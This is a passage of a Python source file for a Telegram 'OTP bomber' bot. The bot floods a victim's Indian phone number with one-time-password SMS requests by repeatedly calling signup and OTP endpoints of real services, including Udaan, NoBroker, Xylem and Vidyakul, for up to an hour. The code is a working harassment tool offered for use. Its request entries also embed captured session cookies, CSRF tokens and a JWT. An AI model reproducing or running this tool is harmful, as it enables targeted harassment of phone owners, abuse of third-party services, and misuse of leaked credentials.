        "url": lambda p, d: "http://www.pinknblu.com/v1/auth/generate/otp",
        "method": "POST",
        "headers": {
            "Accept": "application/json, text/javascript, */*; q=0.01",
            "Accept-Language": "en-GB,en-US;q=0.9,en;q=0.8",
            "Connection": "keep-alive",
            "Content-Type": "application/x-www-form-urlencoded; charset=UTF-8",
            "Cookie": "laravel_session=eyJpdiI6IlBkMkhkZnN3NWpmSE9vQ3Q2VUlyTXc9PSIsInZhbHVlIjoiWHZQTE1HYmhyUTljcWk1NVhyN3hUUkZvYituYzVHclA5NHZ4RHlvaEJNcnNIdENIUmJ6RVNnbjU2bEh5YUE4VVExRzZnRjArK01ZWm4yRmFmZGtobXY0aUw2ZEVaVk1takZKSSt1OW8wcGt6NmZKT1hcL3FlaTd1WjhaemNKXC9tQSIsIm1hYyI6ImRiNTViNjJhZjRjNTE4MWFjMTE4OGYxNWU3M2ExZTAyM2Q3OGVhYTY1NjVhNGY0ZWI3MDQ5YmVjM2M1MGNiYTAifQ%3D%3D; _ga=GA1.1.173966415.1716892374; _gcl_au=1.1.1212519590.1716892374; _fbp=fb.1.1716892385789.994456642; _ga_S6S2RJNH92=GS1.1.1716892373.1.1.1716892425.0.0.0; _ga_8B7LH5VE3Z=GS1.1.1716892374.1.1.1716892425.0.0.0",
            "Origin": "http://www.pinknblu.com",
            "Referer": "http://www.pinknblu.com/",
            "User-Agent": "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/125.0.0.0 Safari/537.36",
            "X-Requested-With": "XMLHttpRequest"
        },
        "data": lambda p, d: f"_token=HvvCsMqCY6poDB4GYPd2DJxewZ6H6TWPMHt8hfEV&country_code=%2B91&phone={p}"
    },
    
    {
        "name": "Udaan",
        "url": lambda p, d: "https://auth.udaan.com/api/otp/send?client_id=udaan-v2",
        "method": "POST",
        "headers": {
            "accept": "*/*",
            "accept-language": "en-IN",
            "content-type": "application/x-www-form-urlencoded;charset=UTF-8",
            "cookie": "_gid=GA1.2.390459560.1717491496; sid=OF6ijMUYe94BAJPF2m5KGXveYuKyBSVwv+8eUiBFoetQsOwBEf29e+ZR5RacCERPDWwsGifGpzmIdknNx7TaCkm4; mp_a67dbaed1119f2fb093820c9a14a2bcc_mixpanel=%7B%22distinct_id%22%3A%20%22%24device%3A18fa628beb42fc6-0b4da1b51d2b74-26001c51-100200-18fa628beb42fc6%22%2C%22%24device_id%22%3A%20%2218fa628beb42fc6-0b4da1b51d2b74-26001c51-100200-18fa628beb42fc6%22%2C%22%24search_engine%22%3A%20%22google%22%2C%22%24initial_referrer%22%3A%20%22https%3A%2F%2Fwww.google.com%2F%22%2C%22%24initial_referring_domain%22%3A%20%22www.google.com%22%2C%22mps%22%3A%20%7B%7D%2C%22mpso%22%3A%20%7B%22%24initial_referrer%22%3A%20%22https%3A%2F%2Fwww.google.com%2F%22%2C%22%24initial_referring_domain%22%3A%20%22www.google.com%22%7D%2C%22mpus%22%3A%20%7B%7D%2C%22mpa%22%3A%20%7B%7D%2C%22mpu%22%3A%20%7B%7D%2C%22mpr%22%3A%20%5B%5D%2C%22__mpap%22%3A%20%5B%5D%7D; _gat_gtag_UA_180706540_1=1; WZRK_S_8R9-67W-W75Z=%7B%22p%22%3A1%7D; _ga_VDVX6P049R=GS1.1.1717491507.1.0.1717491507.0.0.0; _ga=GA1.1.393162471.1716479639",
            "origin": "https://auth.udaan.com",
            "priority": "u=1, i",
            "referer": "https://auth.udaan.com/login/v2/mobile?cid=udaan-v2&cb=https%3A%2F%2Fudaan.com%2F_login%2Fcb&v=2",
            "sec-ch-ua": '"Google Chrome";v="125", "Chromium";v="125", "Not.A/Brand";v="24"',
            "sec-ch-ua-mobile": "?0",
            "sec-ch-ua-platform": '"Windows"',
            "sec-fetch-dest": "empty",
            "sec-fetch-mode": "cors",
            "sec-fetch-site": "same-origin",
            "traceparent": "00-db9fd114c85d50d740faf1697fafe008-10128c0be7778059-00",
            "user-agent": "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/125.0.0.0 Safari/537.36",
            "x-app-id": "udaan-auth"
        },
        "data": lambda p, d: f"mobile={p}"
    },
    
    {
        "name": "Xylem",
        "url": lambda p, d: "https://xylem-api.penpencil.co/v1/users/register/64254d66be2a390018e6d348",
        "method": "POST",
        "headers": {
            "sec-ch-ua": '"Google Chrome";v="125", "Chromium";v="125", "Not.A/Brand";v="24"',
            "sec-ch-ua-mobile": "?0",
            "client-version": "300",
            "Authorization": "Bearer",
            "User-Agent": "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/125.0.0.0 Safari/537.36",
            "Content-Type": "application/json",
            "Accept": "application/json, text/plain, */*",
            "Referer": "https://www.xylem.live/",
            "randomId": "bfc4e54e-1873-48cc-823e-40d401d9dbb4",
            "client-id": "64254d66be2a390018e6d348",
            "client-type": "WEB",
            "sec-ch-ua-platform": '"Windows"'
        },
        "data": lambda p, d: json.dumps({"mobile": p, "countryCode": "+91", "firstName": "User"})
    },
    
    {
        "name": "NoBroker",
        "url": lambda p, d: "https://www.nobroker.in/api/v1/account/user/otp/send?otpM=true",
        "method": "POST",
        "headers": {
            "accept": "*/*",
            "accept-language": "en-GB,en-US;q=0.9,en;q=0.8",
            "baggage": "sentry-environment=production,sentry-release=02102023,sentry-public_key=826f347c1aa641b6a323678bf8f6290b,sentry-trace_id=5631cb3b0d6c45f7bbe6cad72d259956",
            "content-type": "application/x-www-form-urlencoded; charset=UTF-8",
            "cookie": "cloudfront-viewer-address=60.243.56.169%3A50469; cloudfront-viewer-country=IN; cloudfront-viewer-latitude=12.89960; cloudfront-viewer-longitude=80.22090; headerFalse=false; isMobile=false; deviceType=web; js_enabled=true; nbcr=bangalore; nbpt=RENT; nbSource=www.google.com; nbMedium=organic; nbCampaign=https%3A%2F%2Fwww.google.com%2F; _fbp=fb.1.1717523419577.584874862107093753; __zlcmid=1M6mlnN1oPHJHpz; _gcl_au=1.1.1317100846.1717523446; moe_uuid=066d95a8-7171-4415-bb99-8c3208dd358a; _gid=GA1.2.1017913527.1717523447; _gat_UA-46762303-1=1; nbDevice=desktop; mbTrackID=f80f8a7ed66e49bd94ecb36eb4ec1231; JSESSION=a00e843f-c089-4974-bf93-187b368b5fd6; _ga=GA1.2.1392560530.1717523447; _ga_BS11V183V6=GS1.1.1717523448.1.0.1717523449.0.0.0; SPRING_SECURITY_REMEMBER_ME_COOKIE=RE5nY1B6emFITDNROURiK3Q3bGUxZz09OmVhNHhhMmFtdGtYK3lCU0d3VVZFelE9PQ; nbccc=ce1dab2af6f44009bd5b52e763f82eb6; loggedInUserStatus=new; _f_au=eyJhbGciOiJSUzI1NiJ9.eyJhdWQiOiJodHRwczovL2lkZW50aXR5dG9vbGtpdC5nb29nbGVhcGlzLmNvbS9nb29nbGUuaWRlbnRpdHkuaWRlbnRpdHl0b29sa2l0LnYxLklkZW50aXR5VG9vbGtpdCIsImV4cCI6MTcxNzUyNzA5NSwiaWF0IjoxNzE3NTIzNDk1LCJpc3MiOiJub2Jyb2tlci1maXJlYmFzZUBuby1icm9rZXIuaWFtLmdzZXJ2aWNlYWNjb3VudC5jb20iLCJzdWIiOiJub2Jyb2tlci1maXJlYmFzZUBuby1icm9rZXIuaWFtLmdzZXJ2aWNlYWNjb3VudC5jb20iLCJ1aWQiOiI4YTlmODVjMzhmZTQzNWFhMDE4ZmU0NjBiYWUwMGE1NCJ9.MrM3GFgrPEXnRagMOJDt6qUWkJDGts7uqpGV_o9fp9GHhyxYEnfwglMuc_tjA0wUFi79z376sLUIhVB8RsFHmueWEkxFRhaWcHXpj0CoiwYrKfY-h1PlxxwK6CiqFj0KXlcF21y_bulFwdBGtJzRY4vsYIdDpZI5eIv9wZip2e1i8aQXrHrcQNaZBcnI8a9kyelHeaSsQrkLKcX1ujan-beemsh4H0InDVLTGlYgXKgnQZlN5Ee5eZjlASbwYu7UdkHhanQN9XSJNqPyG2P7gGuN3Ma8z3_WXcslVcAzO0kJqozOAg3eyuqkPVttvliYZf4Hw5as-NbtXDI6mqvZ2A; _ud_check=true; _ud_basic=true; _ud_login=true; _ga_SQ9H8YK20V=GS1.1.1717523447.1.1.1717523496.11.0.502991464",
            "origin": "https://www.nobroker.in",
            "priority": "u=1, i",
            "referer": "https://www.nobroker.in/",
            "sec-ch-ua": '"Google Chrome";v="125", "Chromium";v="125", "Not.A/Brand";v="24"',
            "sec-ch-ua-mobile": "?0",
            "sec-ch-ua-platform": '"Windows"',
            "sec-fetch-dest": "empty",
            "sec-fetch-mode": "cors",
            "sec-fetch-site": "same-origin",
            "sentry-trace": "5631cb3b0d6c45f7bbe6cad72d259956-8b4734b3007bc507",
            "user-agent": "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/125.0.0.0 Safari/537.36"
        },
        "data": lambda p, d: f"phone=%2B91{p}"
    },
    
    {
        "name": "Vidyakul",
        "url": lambda p, d: "https://vidyakul.com/signup-otp/send",
        "method": "POST",
        "headers": {
            "accept": "application/json, text/javascript, */*; q=0.01",
            "accept-language": "en-GB,en-US;q=0.9,en;q=0.8",
            "content-type": "application/x-www-form-urlencoded; charset=UTF-8",
            "cookie": "vidyakul_selected_languages=eyJpdiI6ImF1QUVZTjlSaXlxWkVZeUVJT0puNFE9PSIsInZhbHVlIjoiM2UwTExVUmxnNGYyZW1jeEhZYmgyS1wvdEJIdmw1dzFwSnJZWUhGdmF6U009IiwibWFjIjoiOGM3NTBlYjQ1Y2JjODJjYmU1ZGY1Y2EyNTc4YWI0Mzc1YmRmYWRkZTY5Y2QzMjY3NjExOTRiMGVlMmVhMGU4MiJ9; _gcl_au=1.1.1032572450.1715943378; XSRF-TOKEN=eyJpdiI6IjViN3I2Q0h4aG02XC9TVjUwZjdkcklnPT0iLCJ2YWx1ZSI6InF4bDk0RHhMRHhjcVJsVTlPYnk4MHlWaGJcL210N2poZ3JpaldpdlQ1YVwvUTFsSFwvU2lTV1BERWNFTFR4eTJkUnVsclNxMzJUN3VoRjh0cWI4bjdWMEVBPT0iLCJtYWMiOiI3YzJmZGY5NTMzMGQ3MmMwZGExYTEwNDc1MTk3MzVkOTE4ODk1YmI3NTJiZjViNGRmYThiOGVlZGU2YWNmNzg5In0%3D; vidyakul_session=eyJpdiI6IjdHamVPRmNoY1NwS0QzaVJNTFpSZGc9PSIsInZhbHVlIjoiM2Uxc2lnQThTR0tObHBCbFo1Z01tS1kxejM2TjRQNEFlNGhzT05ieEpodzFURVBcL3lJU01oYlRcLzFuUDlmT3RVWTF3ZERJSlN1SSttWHpYazExNDJOUT09IiwibWFjIjoiYmY0NDU0ODMxZTcyZTM2NGFkZmExNmM0YjU3OTY4MmUxNTg5ODM0NWY0NTM1ZWFhODJhMGEyODY0ZTYxNDBjZCJ9; vidyakul_selected_stream=eyJpdiI6Inc3cHVkS05wRm1KTVBJVjhpWmRORlE9PSIsInZhbHVlIjoib3E1aHk0bWJMak9UZGs3NmtJQ0hOcXN0XC9Bdm16YmpUT1NOVFRjQ21QaGc9IiwibWFjIjoiMGNhYzBjMjQyN2E0NmY5NGRkYTQwZjlhOTE4ZDMxNzAyYzNiMmFlYWMxMTg5MzRkZWExY2I1NDA1MjQwMzM5MiJ9; initialTrafficSource=utmcsr=google|utmcmd=organic|utmccn=(not set)|utmctr=(not provided); utmzzses=1; trustedsite_visit=1; WZRK_S_4WZ-K47-ZZ6Z=%7B%22p%22%3A1%7D; _hjSessionUser_2242206=eyJpZCI6IjYxZTE2NGEyLTc0ZDYtNTQ3NS04NDIyLTg0MTYwNDhmMDhhYSIsImNyZWF0ZWQiOjE3MTU5NDMzOTQ1ODksImV4aXN0aW5nIjpmYWxzZX0=; _hjSession_2242206=eyJpZCI6ImI0NGUwMmRkLTlhMjktNDJjMi1hMjA4LTdmYWE0NGFhNTYxYiIsImMiOjE3MTU5NDMzOTQ2MTQsInMiOjAsInIiOjAsInNiIjowLCJzciI6MCwic2UiOjAsImZzIjoxLCJzcCI6MH0=; _fbp=fb.1.1715943395600.1219722189; _ga=GA1.2.2084879805.1715943396; _gid=GA1.2.840887730.1715943396; _gat_UA-106550841-2=1; _ga_53F4FQTTGN=GS1.2.1715943400.1.0.1715943400.60.0.0; ajs_anonymous_id=e2b40642-510a-4751-82ba-9f4a307f6488; mp_d3dd7e816ab59c9f9ae9d76726a5a32b_mixpanel=%7B%22distinct_id%22%3A%20%22%24device%3A18f863276877d02-084cb1dab8c848-26001c51-100200-18f863276877d03%22%2C%22%24device_id%22%3A%20%2218f863276877d02-084cb1dab8c848-26001c51-100200-18f863276877d03%22%2C%22mp_lib%22%3A%20%22Segment%3A%20web%22%2C%22%24search_engine%22%3A%20%22google%22%2C%22%24initial_referrer%22%3A%20%22https%3A%2F%2Fwww.google.com%2F%22%2C%22%24initial_referring_domain%22%3A%20%22www.google.com%22%2C%22mps%22%3A%20%7B%7D%2C%22mpso%22%3A%20%7B%22%24initial_referrer%22%3A%20%22https%3A%2F%2Fwww.google.com%2F%22%2C%22%24initial_referring_domain%22%3A%20%22www.google.com%22%7D%2C%22mpus%22%3A%20%7B%7D%2C%22mpa%22%3A%20%7B%7D%2C%22mpu%22%3A%20%7B%7D%2C%22mpr%22%3A%20%5B%5D%2C%22mpap%22%3A%20%5B%5D%7D",
            "origin": "https://vidyakul.com",
            "priority": "u=1, i",
            "referer": "https://vidyakul.com/class-12th/test-series",
            "sec-ch-ua": '"Google Chrome";v="125", "Chromium";v="125", "Not.A/Brand";v="24"',
            "sec-ch-ua-mobile": "?0",
            "sec-ch-ua-platform": '"Windows"',
            "sec-fetch-dest": "empty",
            "sec-fetch-mode": "cors",
            "sec-fetch-site": "same-origin",
            "user-agent": "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/126.0.0.0 Safari/537.36",
            "x-csrf-token": "el0GIsHQSO3Y4upLoQOm3coVWNEiNtiKJONg2LJx",
            "x-requested-with": "XMLHttpRequest"
        },
        "data": lambda p, d: f"phone={p}"
    }
]

def load_approved_groups():
    if os.path.exists(APPROVED_GROUPS_FILE):
        with open(APPROVED_GROUPS_FILE, 'r') as f:
            return set(json.load(f))
    return set()

def save_approved_groups(groups):
    with open(APPROVED_GROUPS_FILE, 'w') as f:
        json.dump(list(groups), f)

def is_owner(user_id):
    return OWNER_ID is not None and user_id == OWNER_ID

def is_group_approved(chat_id):
    approved_groups = load_approved_groups()
    return chat_id in approved_groups

class BomberBot:
    def __init__(self):
        self.active_attacks = {}
    
    async def send_progress_message(self, update, phone, duration, user_id):
        """Send initial message with progress bar"""
        message = (
            "💀 *OTP BOMBER BOT - 70+ APIS* 💀\n\n"
            "┌─────────────────────┐\n"
            f"│ 📱 *Target:* `+91{phone}`\n"
            f"│ ⏰ *Duration:* `{duration} min`\n"
            f"│ 📡 *APIs:* `{len(APIS)}`\n"
            "│ 🔄 *Auto-Repeat:* `OFF`\n"
            "└─────────────────────┘\n\n"
            "🔄 *INITIALIZING BOMBING...*\n"
            "`[░░░░░░░░░░] 0%`\n\n"
            "📊 *Requests Sent:* `0`\n"
            "✅ *Successful:* `0`\n"
            "❌ *Failed:* `0`\n"
            "🔄 *Cycles:* `0`\n\n"
            "⏱️ *Time Remaining:* `0:00`\n\n"
            "🛑 Use `/stop` to stop bombing"
        )
        sent_msg = await update.message.reply_text(message, parse_mode=ParseMode.MARKDOWN)
        return sent_msg
    
    async def update_progress(self, user_id, success, failed, cycles, total_requests):
        """Update progress bar with accurate information"""
        stats = self.active_attacks.get(user_id)
        if not stats or not stats["running"]:
            return
        
        # Calculate elapsed time and remaining time
        elapsed = int(time.time() - stats["start_time"])
        total_seconds = stats["duration_minutes"] * 60
        remaining = max(0, total_seconds - elapsed)
        remaining_min = remaining // 60
        remaining_sec = remaining % 60
        
        # Calculate overall progress percentage based on time
        time_percentage = min(int((elapsed / total_seconds) * 100), 100)
        
        # Create progress bar
        filled = int(time_percentage / 10)
        bar = "█" * filled + "░" * (10 - filled)
        
        # Format elapsed time
        elapsed_min = elapsed // 60
        elapsed_sec = elapsed % 60
        
        progress_msg = (
            "💀 *OTP BOMBER BOT - 70+ APIS* 💀\n\n"
            "┌─────────────────────┐\n"
            f"│ 📱 *Target:* `+91{stats['phone']}`\n"
            f"│ ⏱️ *Elapsed:* `{elapsed_min}:{elapsed_sec:02d}`\n"
            f"│ 📡 *APIs:* `{len(APIS)}`\n"
            "└─────────────────────┘\n\n"
            f"🔄 *STATUS:* `BOMBING IN PROGRESS`\n"
            f"📊 *Progress:* `{bar} {time_percentage}%`\n\n"
            f"📨 *Total Requests:* `{total_requests}`\n"
            f"✅ *Successful:* `{success}`\n"
            f"❌ *Failed:* `{failed}`\n"
            f"🔄 *Cycles:* `{cycles}`\n\n"
            f"⏱️ *Time Remaining:* `{remaining_min}:{remaining_sec:02d}`\n\n"
            "🛑 Use `/stop` to stop bombing"
        )
        
        try:
            await stats["sent_msg"].edit_text(progress_msg, parse_mode=ParseMode.MARKDOWN)
        except Exception as e:
            print(f"Progress update error: {e}")
    
    async def start_bombing(self, phone, duration, user_id, sent_msg):
        if user_id in self.active_attacks:
            await sent_msg.edit_text("⚠️ *Already bombing! Use /stop first.*", parse_mode=ParseMode.MARKDOWN)
            return False
        
        if len(phone) != 10 or not phone.isdigit():
            await sent_msg.edit_text("❌ *Invalid phone! Send 10 digit number.*", parse_mode=ParseMode.MARKDOWN)
            return False
        
        self.active_attacks[user_id] = {
            "phone": phone, 
            "running": True,
            "start_time": time.time(),
            "success": 0,
            "failed": 0,
            "cycles": 0,
            "sent_msg": sent_msg,
            "total_requests": 0,
            "duration_minutes": duration
        }
        
        asyncio.create_task(self._bomb_worker(user_id, phone, duration))
        return True
    
    async def stop_bombing(self, user_id):
        if user_id in self.active_attacks:
            stats = self.active_attacks[user_id]
            stats["running"] = False
            duration = time.time() - stats["start_time"]
            elapsed_min = int(duration // 60)
            elapsed_sec = int(duration % 60)
            
            # Final stats message with bold formatting
            final_msg = (
                "🛑 *BOMBING COMPLETED!*\n\n"
                "┌─────────────────────┐\n"
                f"│ 📨 *Total Requests:* `{stats['total_requests']}`\n"
                f"│ ✅ *Success:* `{stats['success']}`\n"
                f"│ ❌ *Failed:* `{stats['failed']}`\n"
                f"│ 🔄 *Cycles:* `{stats['cycles']}`\n"
                f"│ ⏰ *Duration:* `{elapsed_min}:{elapsed_sec:02d}`\n"
                f"│ 📱 *Target:* `+91{stats['phone']}`\n"
                "└─────────────────────┘"
            )
            
            # Update final message
            try:
                await stats['sent_msg'].edit_text(final_msg, parse_mode=ParseMode.MARKDOWN)
            except:
                pass
            
            del self.active_attacks[user_id]
            return True
        return False
    
    async def get_stats(self, user_id):
        if user_id in self.active_attacks:
            stats = self.active_attacks[user_id]
            duration = time.time() - stats["start_time"]
            elapsed_min = int(duration // 60)
            elapsed_sec = int(duration % 60)
            return (
                f"📊 *LIVE STATS*\n\n"
                f"📨 *Total Requests:* `{stats['total_requests']}`\n"
                f"✅ *Success:* `{stats['success']}`\n"
                f"❌ *Failed:* `{stats['failed']}`\n"
                f"🔄 *Cycles:* `{stats['cycles']}`\n"
                f"⏰ *Duration:* `{elapsed_min}:{elapsed_sec:02d}`\n"
                f"📱 *Target:* `+91{stats['phone']}`\n"
                f"⚡ *Status:* `RUNNING...`"
            )
        return "ℹ️ *No active bombing. Use /bomb to start.*"
    
    async def _bomb_worker(self, user_id, phone, duration_minutes):
        end_time = time.time() + (duration_minutes * 60)
        
        while (user_id in self.active_attacks and 
               self.active_attacks[user_id]["running"] and 
               time.time() < end_time):
            
            try:
                self.active_attacks[user_id]["cycles"] += 1
                cycle_requests = 0
                
                async with aiohttp.ClientSession() as session:
                    tasks = []
                    for api in APIS:
                        if not self.active_attacks[user_id]["running"]:
                            break
                        
                        url = api["url"](phone, duration_minutes)
                        headers = api.get("headers", {})
                        
                        # FIX: Check if data is callable before calling it
                        if api["data"] is not None and callable(api["data"]):
                            data = api["data"](phone, duration_minutes)
                        else:
                            data = api["data"]  # None or static data
                        
                        task = self._send_request(session, url, api["method"], headers, data, api["name"])
                        tasks.append(task)
                        cycle_requests += 1
                    
                    results = await asyncio.gather(*tasks, return_exceptions=True)
                    
                    cycle_success = 0
                    for success in results:
                        if isinstance(success, bool) and success:
                            self.active_attacks[user_id]["success"] += 1
                            cycle_success += 1
                        elif isinstance(success, Exception):
                            self.active_attacks[user_id]["failed"] += 1
                        else:
                            self.active_attacks[user_id]["failed"] += 1
                    
                    # Update total requests count
                    self.active_attacks[user_id]["total_requests"] += cycle_requests
                    
                    # Update progress bar
                    stats = self.active_attacks[user_id]
                    await self.update_progress(
                        user_id,
                        stats['success'], 
                        stats['failed'], 
                        stats['cycles'],
                        stats['total_requests']
                    )
                
                # Small delay to prevent rate limiting
                await asyncio.sleep(1)
                
            except Exception as e:
                print(f"Bombing error: {e}")
                await asyncio.sleep(2)
        
        # Auto-stop when duration completes
        if user_id in self.active_attacks and self.active_attacks[user_id]["running"]:
            self.active_attacks[user_id]["running"] = False
            await self.stop_bombing(user_id)
    
    async def _send_request(self, session, url, method, headers, data, api_name):
        try:
            if method == "POST":
                async with session.post(url, headers=headers, data=data, timeout=10) as response:
                    print(f"✅ {api_name} - Status: {response.status}")
                    return response.status in [200, 201, 202, 204]
            else:
                async with session.get(url, headers=headers, timeout=10) as response:
                    print(f"✅ {api_name} - Status: {response.status}")
                    return response.status in [200, 201, 202, 204]
        except Exception as e:
            print(f"❌ {api_name} - Failed: {e}")
            return False

# Initialize bot
bomber = BomberBot()

# Telegram handlers
async def start(update: Update, context: ContextTypes.DEFAULT_TYPE):
    chat_id = update.effective_chat.id
    
    # Check if it's a group
    if update.effective_chat.type == "private":
        await update.message.reply_text(
            "❌ *This bot only works in groups!*\n\n"
            "Add me to a group and ask the admin to approve the group first.",
            parse_mode=ParseMode.MARKDOWN
        )
        return
    
    # Check if group is approved
    if not is_group_approved(chat_id):
        await update.message.reply_text(
            "❌ *This group is not approved!*\n\n"
            "Only owner can approve groups using:\n"
            "`/approve <group_id>`\n\n"
            f"*Your Group ID:* `{chat_id}`",
            parse_mode=ParseMode.MARKDOWN
        )
        return
    
    await update.message.reply_text(
        "💀 *OTP BOMBER BOT - 70+ APIS* 💀\n\n"
        "┌─────────────────────┐\n"
        "│ 📋 *Commands:*\n"
        "│   /bomb <phone> <duration>\n"
        "│   /stop\n"
        "│   /stats\n"
        "└─────────────────────┘\n\n"
        "🎯 *Example:*\n"
        "`/bomb 9876543210 5`\n\n"
        f"⚡ *{len(APIS)} APIs Loaded!*\n"
        "⚠️ *Use responsibly!*",
        parse_mode=ParseMode.MARKDOWN
    )

async def bomb(update: Update, context: ContextTypes.DEFAULT_TYPE):
    chat_id = update.effective_chat.id
    user_id = update.effective_user.id
    
    # Check if it's a group
    if update.effective_chat.type == "private":
        await update.message.reply_text(
            "❌ *This bot only works in groups!*",
            parse_mode=ParseMode.MARKDOWN
        )
        return
    
    # Check if group is approved
    if not is_group_approved(chat_id):
        await update.message.reply_text(
            "❌ *This group is not approved!*\n\n"
            "Contact the bot owner to approve this group.",
            parse_mode=ParseMode.MARKDOWN
        )
        return
    
    if len(context.args) != 2:
        await update.message.reply_text(
            "❌ *Usage:* `/bomb <phone> <duration>`\n"
            "*Example:* `/bomb 9876543210 5`",
            parse_mode=ParseMode.MARKDOWN
        )
        return
    
    phone, duration = context.args
    
    if not phone.isdigit() or len(phone) != 10:
        await update.message.reply_text(
            "❌ *Invalid phone number! Please enter 10 digits.*",
            parse_mode=ParseMode.MARKDOWN
        )
        return
    
    try:
        duration = int(duration)
        if duration <= 0 or duration > 60:
            await update.message.reply_text(
                "❌ *Invalid duration! Use 1-60 minutes.*",
                parse_mode=ParseMode.MARKDOWN
            )
            return
    except ValueError:
        await update.message.reply_text(
            "❌ *Invalid duration! Use numbers only.*",
            parse_mode=ParseMode.MARKDOWN
        )
        return
    
    # Send progress message
    sent_msg = await bomber.send_progress_message(update, phone, duration, user_id)
    
    # Start bombing
    success = await bomber.start_bombing(phone, duration, user_id, sent_msg)
    if not success:
        # Error message already sent in start_bombing
        pass

async def stop(update: Update, context: ContextTypes.DEFAULT_TYPE):
    chat_id = update.effective_chat.id
    user_id = update.effective_user.id
    
    # Check if it's a group
    if update.effective_chat.type == "private":
        await update.message.reply_text(
            "❌ *This bot only works in groups!*",
            parse_mode=ParseMode.MARKDOWN
        )
        return
    
    # Check if group is approved
    if not is_group_approved(chat_id):
        await update.message.reply_text(
            "❌ *This group is not approved!*",
            parse_mode=ParseMode.MARKDOWN
        )
        return
    
    result = await bomber.stop_bombing(user_id)
    if result:
        await update.message.reply_text(
            "✅ *Bombing stopped successfully!*",
            parse_mode=ParseMode.MARKDOWN
        )
    else:
        await update.message.reply_text(
            "⚠️ *No active bombing to stop!*",
            parse_mode=ParseMode.MARKDOWN
        )

async def stats(update: Update, context: ContextTypes.DEFAULT_TYPE):
    chat_id = update.effective_chat.id
    user_id = update.effective_user.id
    
    # Check if it's a group
    if update.effective_chat.type == "private":
        await update.message.reply_text(
            "❌ *This bot only works in groups!*",
            parse_mode=ParseMode.MARKDOWN
        )
        return
    
    # Check if group is approved
    if not is_group_approved(chat_id):
        await update.message.reply_text(
            "❌ *This group is not approved!*",
            parse_mode=ParseMode.MARKDOWN
        )
        return
    
    result = await bomber.get_stats(user_id)
    await update.message.reply_text(result, parse_mode=ParseMode.MARKDOWN)

# Owner-only commands
async def approve(update: Update, context: ContextTypes.DEFAULT_TYPE):
    user_id = update.effective_user.id
    
    if not is_owner(user_id):
        await update.message.reply_text(
            "❌ *Only the bot owner can use this command!*",
            parse_mode=ParseMode.MARKDOWN
        )
        return
    
    if len(context.args) != 1:
        await update.message.reply_text(
            "❌ *Usage:* `/approve <group_id>`\n"
            "*Example:* `/approve -1001234567890`",
            parse_mode=ParseMode.MARKDOWN
        )
        return
    
    try:
        group_id = int(context.args[0])
        approved_groups = load_approved_groups()
        approved_groups.add(group_id)
        save_approved_groups(approved_groups)
        
        await update.message.reply_text(
            f"✅ *Group approved successfully!*\n\n"
            f"📊 *Group ID:* `{group_id}`\n"
            f"📈 *Total approved:* `{len(approved_groups)}`",
            parse_mode=ParseMode.MARKDOWN
        )
    except ValueError:
        await update.message.reply_text(
            "❌ *Invalid Group ID! Please enter a valid number.*",
            parse_mode=ParseMode.MARKDOWN
        )

async def unapprove(update: Update, context: ContextTypes.DEFAULT_TYPE):
    user_id = update.effective_user.id
    
    if not is_owner(user_id):
        await update.message.reply_text(
            "❌ *Only the bot owner can use this command!*",
            parse_mode=ParseMode.MARKDOWN
        )
        return
    
    if len(context.args) != 1:
        await update.message.reply_text(
            "❌ *Usage:* `/unapprove <group_id>`\n"
            "*Example:* `/unapprove -1001234567890`",
            parse_mode=ParseMode.MARKDOWN
        )
        return
    
    try:
        group_id = int(context.args[0])
        approved_groups = load_approved_groups()
        
        if group_id in approved_groups:
            approved_groups.remove(group_id)
            save_approved_groups(approved_groups)
            await update.message.reply_text(
                f"✅ *Group unapproved successfully!*\n\n"
                f"📊 *Group ID:* `{group_id}`\n"
                f"📈 *Total approved:* `{len(approved_groups)}`",
                parse_mode=ParseMode.MARKDOWN
            )
        else:
            await update.message.reply_text(
                f"❌ *Group ID `{group_id}` is not approved!*",
                parse_mode=ParseMode.MARKDOWN
            )
    except ValueError:
        await update.message.reply_text(
            "❌ *Invalid Group ID! Please enter a valid number.*",
            parse_mode=ParseMode.MARKDOWN
        )

async def list_groups(update: Update, context: ContextTypes.DEFAULT_TYPE):
    user_id = update.effective_user.id
    
    if not is_owner(user_id):
        await update.message.reply_text(
            "❌ *Only the bot owner can use this command!*",
            parse_mode=ParseMode.MARKDOWN
        )
        return
    
    approved_groups = load_approved_groups()
    
    if not approved_groups:
        await update.message.reply_text(
            "📋 *No approved groups yet!*\n\n"
            "Use `/approve <group_id>` to add groups.",
            parse_mode=ParseMode.MARKDOWN
        )
        return
    
    groups_list = "\n".join([f"• `{group_id}`" for group_id in approved_groups])
    
    await update.message.reply_text(
        f"📋 *APPROVED GROUPS*\n\n"
        f"{groups_list}\n\n"
        f"📊 *Total:* `{len(approved_groups)}`",
        parse_mode=ParseMode.MARKDOWN
    )

def main():
    try:
        app = Application.builder().token(BOT_TOKEN).build()
        
        # Public commands (work in approved groups only)
        app.add_handler(CommandHandler("start", start))
        app.add_handler(CommandHandler("bomb", bomb))
        app.add_handler(CommandHandler("stop", stop))
        app.add_handler(CommandHandler("stats", stats))
        
        # Owner-only commands
        app.add_handler(CommandHandler("approve", approve))
        app.add_handler(CommandHandler("unapprove", unapprove))
        app.add_handler(CommandHandler("list", list_groups))
        
        print("🤖 OTP BOMBER BOT STARTED!")
        print(f"📡 Loaded {len(APIS)} APIs")
        print(f"👑 Owner ID: {OWNER_ID}")
        print(f"📋 Approved groups file: {APPROVED_GROUPS_FILE}")
        
        # Run the bot
        app.run_polling(drop_pending_updates=True)
        
    except Exception as e:
        print(f"❌ Bot failed to start: {e}")

if __name__ == "__main__":
    main()